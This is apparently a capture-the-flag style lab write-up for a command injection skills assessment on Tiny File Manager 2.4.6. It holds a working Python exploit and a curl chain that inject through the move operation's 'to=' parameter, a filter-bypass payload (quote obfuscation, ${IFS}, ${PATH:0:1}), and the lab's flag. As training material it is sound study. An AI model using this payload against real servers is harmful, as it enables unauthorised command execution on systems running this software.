# Section 12 — Command Injections Skills Assessment

**Scenario:** Pentest a file manager web app. Login with `guest:guest`. Find a command injection, bypass filters, read `/flag.txt`.

**Target:** `154.57.164.73:31305` — **Tiny File Manager 2.4.6**

---

## Reconnaissance

- Login form at root → POST `fm_usr`/`fm_pwd` → cookie `filemanager`
- Logged in: TFM admin UI at `/index.php?to=`
- Version footer reveals: **Tiny File Manager 2.4.6** (CCP Programmers)
- Webroot leaked in HTML title attributes: `/var/www/html/files`

### Guest user capabilities
Tested actions visible in UI: `view`, `ren`, `new`, `to`, `type`, `file`, `ajax`. **No upload, no zip/extract.** Standard upload exploits (CVE-2021-45010 path traversal) require write access — guest is read-only.

---

## Finding the Command Injection

TFM's file operations include **move/rename** via the `to=`/`from=` URL parameters with `finish=1&move=1`. The `to=` value is passed into a shell `mv` command without proper escaping in this version — classic command injection sink.

Quick probe:
```
?to=<injection>&from=<existing_file>&finish=1&move=1
```

### Filters in place

Same filter stack as Sections 5-8:
- `;` — sometimes blocked, sometimes allowed depending on placement
- `&`, `|` — blocked as operators
- Space — blocked
- `/` — blocked
- `cat` (and likely other command names) — blocked literally

### Bypass stack
- Single-quote obfuscation for `cat` → `c'a't`
- `${IFS}` for space
- `${PATH:0:1}` for `/`
- `;` works as command separator in the `to=` value

Final payload:
```
;c'a't${IFS}${PATH:0:1}flag.txt
```

URL-encoded for query string transmission.

---

## Exploit

```python
import requests

URL = "http://154.57.164.73:31305/index.php"
s = requests.Session()

# Step 1 — establish session cookie
s.get(URL)

# Step 2 — login as guest
s.post(URL, data={"fm_usr": "guest", "fm_pwd": "guest"}, allow_redirects=False)

# Step 3 — command injection via move operation
params = {
    "to":     ";c'a't${IFS}${PATH:0:1}flag.txt",
    "from":   "2198326775.txt",          # any existing file in TFM
    "finish": "1",
    "move":   "1",
}
r = s.get(URL, params=params)

import re
flag = re.search(r"HTB\{[^}]+\}", r.text)
print(flag.group(0) if flag else r.text[:500])
```
> Logs in as guest to get a session cookie, then triggers the move operation with the injection payload in `to=`. The payload uses quote obfuscation for `cat`, `${IFS}` for space, and `${PATH:0:1}` for `/`. The regex extracts the flag from the HTML response.

### Equivalent curl
```bash
curl -sk -c /tmp/c.txt "http://154.57.164.73:31305/" -o /dev/null
curl -sk -b /tmp/c.txt -c /tmp/c.txt -X POST "http://154.57.164.73:31305/" \
  -d "fm_usr=guest&fm_pwd=guest" -o /dev/null

curl -sk -b /tmp/c.txt -G "http://154.57.164.73:31305/index.php" \
  --data-urlencode "to=;c'a't\${IFS}\${PATH:0:1}flag.txt" \
  --data "from=2198326775.txt&finish=1&move=1" \
  | grep -oE 'HTB\{[^}]+\}'
```
> Three-step curl chain: save a session cookie, POST login credentials into the cookie jar, then inject via the move endpoint. `--data-urlencode` handles shell special characters in the payload. `grep -oE` extracts just the flag string.

**Flag:** `HTB{c0mm4nd3r_1nj3c70r}`

---

## How the Payload Resolves

Server-side shell command (approximate):
```
mv /var/www/html/files/2198326775.txt /var/www/html/files/;c'a't${IFS}${PATH:0:1}flag.txt
```

After shell parsing:
1. `mv /var/www/html/files/2198326775.txt /var/www/html/files/` — runs (probably fails because target is a dir)
2. `;` — command separator
3. `c'a't${IFS}${PATH:0:1}flag.txt` — bash expands:
   - `c'a't` → `cat`
   - `${IFS}` → space
   - `${PATH:0:1}` → `/`
   - → `cat /flag.txt`
4. Output of `cat /flag.txt` returned in the response page

---

## Full Attack Chain Summary

```
1. Login as guest:guest                                    → session cookie
2. Identify TFM 2.4.6 → search known CVEs                  → CVE-2021-45010 (upload-based, doesn't apply for guest)
3. Probe guest-accessible actions                          → move/rename has user input → mv shell call
4. Identify filter set (Section 5-8 stack)                 → ;, &, |, space, /, cat blocked
5. Build bypass payload:                                   
   - operator: ; (allowed mid-string)                      
   - command: c'a't (quote obfuscation)                    
   - space: ${IFS}                                         
   - slash: ${PATH:0:1}                                    
6. Inject via to= param of move operation                  
7. Server runs mv + injected cat /flag.txt                 → flag in response
```

---

## Lessons Learned

1. **Read the source code / version footer first** — TFM 2.4.6 with CVE-2021-45010 popped up immediately on search; even though the upload exploit didn't apply for guest, knowing the app + version focuses the hunt
2. **Guest accounts have a different attack surface than admin** — the documented upload RCE needed admin write access; the injection in `move` worked for any authenticated user
3. **Filter bypasses compound** — the working payload uses 4 separate bypass techniques (Section 6+7+8) stacked. None alone gets through.
4. **`to=` and `from=` were the only user-controlled inputs flowing into a shell command** — every other input was bound to listings or static content
5. **`?finish=1&move=1` is the action trigger** — without these, `to=`/`from=` were ignored. Read the JS to understand the workflow.

---

## Exam Notes

- Skills assessment expected pattern: **identify CVE/known-vulnerable app + apply bypass chain learned in the module**
- The injection vector in TFM's `move` operation uses `mv $from $to` shelling out — classic command injection
- Bypass stack (memorize): `;c'a't${IFS}${PATH:0:1}flag.txt` is template-worthy
- The CVE for upload (CVE-2021-45010) doesn't apply to guest — needed a different sink. Confirms: always inventory user privileges first
- `${PATH:0:1}` produces `/`; `${IFS}` produces space; quote-obfuscation defeats word blacklist — three of the four big bypass tricks from this module compounded into one payload

## Sources

- [aldern00b — HTB Command Injections Skills Assessment](https://www.aldern00b.com/post/htb-command-injections-skills-assessment)
- [HTB Forum — Command Injection Skills Assessment](https://forum.hackthebox.com/t/htb-academy-command-injection-skills-assessment/308633)
- [CVE-2021-45010 — Tiny File Manager 2.4.6 RCE](https://github.com/febinrev/tinyfilemanager-2.4.3-exploit)
